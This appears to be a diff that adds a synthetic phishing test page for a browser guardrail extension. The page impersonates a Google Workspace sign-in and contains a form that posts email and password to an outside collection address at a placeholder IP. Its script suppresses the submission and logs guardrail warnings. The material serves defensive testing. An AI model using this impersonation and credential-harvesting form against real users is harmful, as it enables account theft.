@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <!-- Deceptive Brand Identity Mismatch Sentinels -->
+  <meta name="application-name" content="Google Workspace">
+  <meta property="og:site_name" content="Google Workspace">
+  <title>Google Workspace - Secure Account Sign In</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <main class="page-container">
+    <div class="card" style="border-color: rgba(239, 68, 68, 0.4);">
+      <header class="card-header">
+        <div class="badge" style="background: rgba(239, 68, 68, 0.2); color: #f87171; border-color: rgba(239, 68, 68, 0.4);">
+          Scenario 5: Synthetic Phishing-Style Login Page
+        </div>
+        <h1 id="page-title" style="color: #f87171;">Sign In to Google Workspace</h1>
+        <p class="description">
+          Synthetic test page simulating deceptive brand identity mismatch (claims Google Workspace on non-Google origin) with password credential harvesting fields.
+        </p>
+      </header>
+
+      <section class="test-section">
+        <div id="phishing-status-banner" style="padding: 12px; margin-bottom: 16px; border-radius: 8px; background: rgba(239, 68, 68, 0.1); border: 1px solid rgba(239, 68, 68, 0.3); font-size: 13px; color: #fca5a5;">
+          Awaiting Action (Guardrail advisory warning or protective interception expected on interaction)
+        </div>
+
+        <!-- Phishing form with cross-origin credential harvesting destination -->
+        <form id="phishing-login-form" action="http://198.51.100.24:8080/collect/login" method="POST" style="margin-bottom: 20px;">
+          <div class="field-group" style="margin-bottom: 12px;">
+            <label for="phish-username" class="field-label">Email or Phone</label>
+            <input type="text" id="phish-username" name="email_or_user" class="input-control" placeholder="user@gmail.com" value="target_victim@example.com">
+          </div>
+          <div class="field-group" style="margin-bottom: 16px;">
+            <label for="phish-password" class="field-label">Password</label>
+            <input type="password" id="phish-password" name="password" class="input-control" placeholder="Enter your password" value="syn_pwd_SuperSecretPassword!#99">
+          </div>
+
+          <div style="display: flex; gap: 10px; flex-wrap: wrap;">
+            <!-- Controlled test submit button: synchronous event suppression + advisory modal -->
+            <button 
+              id="phish-controlled-submit-btn" 
+              type="submit" 
+              class="btn btn-primary"
+              data-guardrail-test-action="test-phishing-submit"
+              style="background: #ef4444; border-color: #dc2626;"
+            >
+              Sign In (Controlled Phishing Action)
+            </button>
+
+            <!-- Ambient submit button: exercises ambient sensor & documented boundary -->
+            <button 
+              id="phish-ambient-submit-btn" 
+              type="button" 
+              class="btn btn-secondary"
+            >
+              Sign In (Ambient Unmarked Button)
+            </button>
+          </div>
+        </form>
+
+        <div style="margin-top: 16px; font-size: 13px;">
+          <a id="nav-legit-link" href="synthetic-legitimate.html" class="test-link">&larr; Return to Legitimate Portal</a>
+        </div>
+      </section>
+
+      <div id="event-log" class="event-log">
+        <div class="log-placeholder">Page activity will be logged here...</div>
+      </div>
+    </div>
+  </main>
+
+  <script src="../../extension/dist/content.js"></script>
+  <script src="script.js"></script>
+  <script>
+    (function() {
+      const banner = document.getElementById('phishing-status-banner');
+      const ambientBtn = document.getElementById('phish-ambient-submit-btn');
+      const form = document.getElementById('phishing-login-form');
+
+      if (form) {
+        form.addEventListener('submit', function(e) {
+          e.preventDefault();
+        });
+      }
+
+      if (ambientBtn) {
+        ambientBtn.addEventListener('click', function() {
+          if (window.__TEST_COUNTERS__) {
+            window.__TEST_COUNTERS__.ambientUnmarkedHandlerCalls++;
+          }
+          if (banner) {
+            banner.textContent = 'Ambient unmarked click handler executed. Note: ambient actions cannot be held without controlled test hooks.';
+            banner.style.background = 'rgba(245, 158, 11, 0.2)';
+            banner.style.color = '#fbbf24';
+          }
+        });
+      }
+
+      document.addEventListener('guardrail:action-warned', function(e) {
+        if (banner) {
+          banner.textContent = 'Guardrail Advisory Warning Triggered (Score: ' + (e.detail?.risk?.score ?? 0) + ')';
+          banner.style.background = 'rgba(245, 158, 11, 0.2)';
+          banner.style.color = '#fbbf24';
+        }
+      });
+
+      document.addEventListener('guardrail:action-intercepted', function(e) {
+        if (banner) {
+          banner.textContent = 'Guardrail Action Held in Staging Mode (Score: ' + (e.detail?.risk?.score ?? 0) + ')';
+          banner.style.background = 'rgba(239, 68, 68, 0.2)';
+          banner.style.color = '#f87171';
+        }
+      });
+    })();
+  </script>
+</body>
+</html>
